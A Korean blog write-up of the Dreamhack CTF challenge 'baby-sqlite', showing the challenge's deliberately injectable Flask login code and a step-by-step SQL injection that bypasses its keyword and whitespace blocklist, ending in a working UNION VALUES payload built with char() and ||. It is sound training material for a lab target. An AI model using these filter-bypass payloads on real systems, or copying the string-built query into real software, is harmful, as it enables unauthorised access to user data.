---
layout: single
title: "[Dreamhack] baby-sqlite write-up"
date: 2025-01-11 17:00 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] baby-sqlite

### 😊 문제 설명

- 로그인 서비스입니다.
- SQL INJECTION 취약점을 통해 플래그를 획득하세요!

<br>

### ✏️ 풀이

문제 사이트에 접속해보면 아래와 같은 로그인 폼이 존재하는 것을 볼 수 있다.

<img src="/images/2025-01-11-baby-sqlite/{778B5FD1-E3CA-44A7-996A-6E34FB41AE31}.png" alt="{778B5FD1-E3CA-44A7-996A-6E34FB41AE31}" style="zoom:50%;" />

<img src="/images/2025-01-11-baby-sqlite/{376A12FB-84A5-4CF5-80A6-8211CB863F0B}.png" alt="{376A12FB-84A5-4CF5-80A6-8211CB863F0B}" style="zoom: 50%;" />

<br>

#### 소스코드

```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import urllib
import os
import sqlite3

app = Flask(__name__)
app.secret_key = os.urandom(32)
from flask import _app_ctx_stack

DATABASE = 'users.db'

def get_db():
    top = _app_ctx_stack.top
    if not hasattr(top, 'sqlite_db'):
        top.sqlite_db = sqlite3.connect(DATABASE)
    return top.sqlite_db


try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    uid = request.form.get('uid', '').lower()
    upw = request.form.get('upw', '').lower()
    level = request.form.get('level', '9').lower()

    sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
    for x in sqli_filter:
        if uid.find(x) != -1:
            return 'No Hack!'
        if upw.find(x) != -1:
            return 'No Hack!'
        if level.find(x) != -1:
            return 'No Hack!'

    
    with app.app_context():
        conn = get_db()
        query = f"SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};"
        try:
            req = conn.execute(query)
            result = req.fetchone()

            if result is not None:
                uid = result[0]
                if uid == 'admin':
                    return FLAG
        except:
            return 'Error!'
    return 'Good!'


@app.teardown_appcontext
def close_connection(exception):
    top = _app_ctx_stack.top
    if hasattr(top, 'sqlite_db'):
        top.sqlite_db.close()


if __name__ == '__main__':
    os.system('rm -rf %s' % DATABASE)
    with app.app_context():
        conn = get_db()
        conn.execute('CREATE TABLE users (uid text, upw text, level integer);')
        conn.execute("INSERT INTO users VALUES ('dream','cometrue', 9);")
        conn.commit()

    app.run(host='0.0.0.0', port=8001)

```

<br>

로그인 경로의 소스 코드를 보면 `uid`, `upw`, `level`이라는 값을 소문자로 전부 변환하고, level은 값이 없다면 9로 설정해주고 있다. `sqli_filter` 에 걸리면 No Hack! 문자열을 return하고 이 값들은 `SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};` 이 쿼리에 들어가서 uid가 admin이면 FLAG를 반환한다고 되어있다. 

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    uid = request.form.get('uid', '').lower()
    upw = request.form.get('upw', '').lower()
    level = request.form.get('level', '9').lower()

    sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
    for x in sqli_filter:
        if uid.find(x) != -1:
            return 'No Hack!'
        if upw.find(x) != -1:
            return 'No Hack!'
        if level.find(x) != -1:
            return 'No Hack!'

    
    with app.app_context():
        conn = get_db()
        query = f"SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};"
        try:
            req = conn.execute(query)
            result = req.fetchone()

            if result is not None:
                uid = result[0]
                if uid == 'admin':
                    return FLAG
        except:
            return 'Error!'
    return 'Good!'
```

<br>

보면 아래 메인 코드에서 dream, cometrue, 9로 uid, upw, level을 INSERT한 것을 볼 수 있다.

```python
if __name__ == '__main__':
    os.system('rm -rf %s' % DATABASE)
    with app.app_context():
        conn = get_db()
        conn.execute('CREATE TABLE users (uid text, upw text, level integer);')
        conn.execute("INSERT INTO users VALUES ('dream','cometrue', 9);")
        conn.commit()

    app.run(host='0.0.0.0', port=8001)
```

<br>

먼저 burp로 해당 로그인 패킷을 잡아주고, FLAG의 조건은 `uid`가 admin이어야 하면서 아래의 filter를 우회해야 한다.

```python
sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
```

![{63233C88-0743-408E-A87C-CFA49853F3AA}](/images/2025-01-11-baby-sqlite/{63233C88-0743-408E-A87C-CFA49853F3AA}.png)

<br>
일단 처음에 시도해볼 건 admin이라는 키워드와 공백이 필터링되고 있고, 싱글쿼터는 필터링되지 않고있기 때문에 admin을 like 같은 걸 사용하면 되지 않을까??

<br>

아래처럼 만들었고, 이제 공백을 우회해야 한다. 

```sql
SELECT uid FROM users WHERE uid='' or uid like 'admi%'-- and upw='{upw}' and level={level};
```

<br>
공백은 /**/ 주석으로 한 번 시도해보자.

```sql
SELECT uid FROM users WHERE uid=''/**/or/**/uid/**/like/**/'admi%'-- and upw='{upw}' and level={level};
```

<br>

그럼 최종적으로 uid에 아래와 같은 값을 넣어 테스트해보니 싱글쿼터가 필터링되고 있는 걸 잘못봤다..

```text
'/**/or/**/uid/**/like/**/'admi%'--
```

![**{5D323203-2539-4374-8DBD-DA1E1E05C5E1}**](/images/2025-01-11-baby-sqlite/{5D323203-2539-4374-8DBD-DA1E1E05C5E1}.png)

<br>

그럼 싱글쿼터와 더블쿼터 둘 다 필터링이 되고 있고, 이를 우회하기 위해선 `\` 문자를 사용해서 uid 뒤에있는 싱글쿼터를 문자 형태로 만들어주면 `' and upw=` 까지가 uid 조건으로 들어가서 뒤에 있는 upw 값에 sqli를 넣어볼 수 있다.

```sql
SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};
```

```sql
SELECT uid FROM users WHERE uid='\' and upw='    {upw}' and level={level};
```

<br>

그래서 아래처럼 만들어서 공백은 주석으로, admin 을 16진수 숫자로 바꿔서 테스트해봤는데 안된다.

```sql
SELECT uid FROM users WHERE uid='\' and upw='/**/or/**/uid/**/=/**/0x61646d696e#
```

![{807912D6-BCFC-4526-A8BE-978AEFA77B95}](/images/2025-01-11-baby-sqlite/{807912D6-BCFC-4526-A8BE-978AEFA77B95}.png)

<br>

다른 방법으로 union을 사용해보면 먼저 select가 필터링되어 있기 때문에 values를 사용할 수 있다. 따라서 admin을 16진수로 바꿔 `char`과 `||` 를 사용해서 level에 넣어주면 flag를 확인할 수 있다. 

```sql
9/**/union/**/values(char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))
```

![{410D9FD2-BD87-46A4-9ADF-21221D8EC341}](/images/2025-01-11-baby-sqlite/{410D9FD2-BD87-46A4-9ADF-21221D8EC341}.png)

<br>